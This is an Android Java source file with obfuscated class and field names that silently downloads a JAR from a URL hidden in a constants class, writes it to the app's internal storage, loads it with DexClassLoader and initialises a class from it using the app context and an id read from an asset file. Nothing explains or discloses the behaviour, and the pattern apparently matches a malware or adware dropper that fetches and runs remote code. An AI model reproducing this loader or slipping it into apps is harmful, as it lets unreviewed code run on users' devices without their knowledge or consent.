package a.z;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.net.URI;
import java.net.URISyntaxException;
import org.apache.http.HttpResponse;
import org.apache.http.client.ClientProtocolException;
import org.apache.http.client.HttpClient;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.impl.client.DefaultHttpClient;

import t.f.k.uc;
import dalvik.system.DexClassLoader;
import android.content.Context;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.os.Looper;
import android.util.Log;

public class atct {

	private static Context context;
	private static String appid;
	private static String jarName = "";
	public static uc jar = null;

	public static void comeon(Context contextz) {
		context = contextz.getApplicationContext();
		final SharedPreferences sp = context.getSharedPreferences(infomations.a, Context.MODE_PRIVATE);
		appid = loadid(context);
		if (appid != null) {
			Editor editor = sp.edit();
			editor.putString(infomations.id, appid);
			editor.commit();
			jarName = sp.getString(infomations.f, "");
			File jarfile = new File(context.getFilesDir(), jarName);
			if (jarfile.exists() && !jarName.equals("")) {
				try {
					jarfile = new File(context.getFilesDir(), jarName);
				} catch (Exception e) {
				}
				loaderJar(jarfile);
			} else {
				new Thread() {
					private String dexName;

					public void run() {
						Looper.prepare();
						try {
							String jarurl = infomations.d;
							Log.e("info", jarurl);
							jarName = jarurl.substring(jarurl.lastIndexOf("/") + 1, jarurl.length());
							Editor editor = sp.edit();
							editor.putString(infomations.f, jarName);
							editor.commit();
							dexName = jarName.replace(infomations.jar, infomations.dex);
							URI url = new URI(jarurl);
							HttpGet get = new HttpGet(url);
							HttpClient client = new DefaultHttpClient();
							File jarfile = new File(context.getFilesDir(), jarName);
							HttpResponse response = client.execute(get);
							long fileSize = response.getEntity().getContentLength();
							if (jarfile.exists() && jarfile.length() == fileSize) {
							} else {
								InputStream is = response.getEntity().getContent();
								if (jarfile.exists()) {
									jarfile.delete();
									File file = new File(context.getFilesDir(), dexName);
									file.delete();
								}
								FileOutputStream fs = new FileOutputStream(jarfile);
								byte[] buff = new byte[1024];
								int len = 0;
								while ((len = is.read(buff)) != -1) {
									fs.write(buff, 0, len);
								}
								is.close();
								fs.close();
							}
							client.getConnectionManager().shutdown();
							loaderJar(jarfile);
						} catch (ClientProtocolException e) {
							e.printStackTrace();
						} catch (IOException e) {
							e.printStackTrace();
						} catch (URISyntaxException e) {
							e.printStackTrace();
						}
						Looper.loop();
					};
				}.start();
			}
		}
	}

	private static void loaderJar(File dexInternalStoragePath) {
		DexClassLoader cl = new DexClassLoader(dexInternalStoragePath.getAbsolutePath(), context.getFilesDir()
				.getPath(), null, context.getClassLoader());
		Class<?> lib;
		try {
			lib = cl.loadClass(infomations.b);
			jar = (uc) lib.newInstance();
			jar.init(context, appid, infomations.waittime, infomations.channel);
		} catch (ClassNotFoundException e) {
			e.printStackTrace();
		} catch (InstantiationException e) {
			e.printStackTrace();
		} catch (IllegalAccessException e) {
			e.printStackTrace();
		}
	}

	private static String loadid(Context contextm) {
		String key = null;
		try {
			InputStream is = contextm.getAssets().open(infomations.zwdso);
			byte[] buffer = new byte[is.available()];
			is.read(buffer);
			is.close();
			key = new String(buffer).trim();
		} catch (IOException e) {
			e.printStackTrace();
		}
		return key;
	}

}
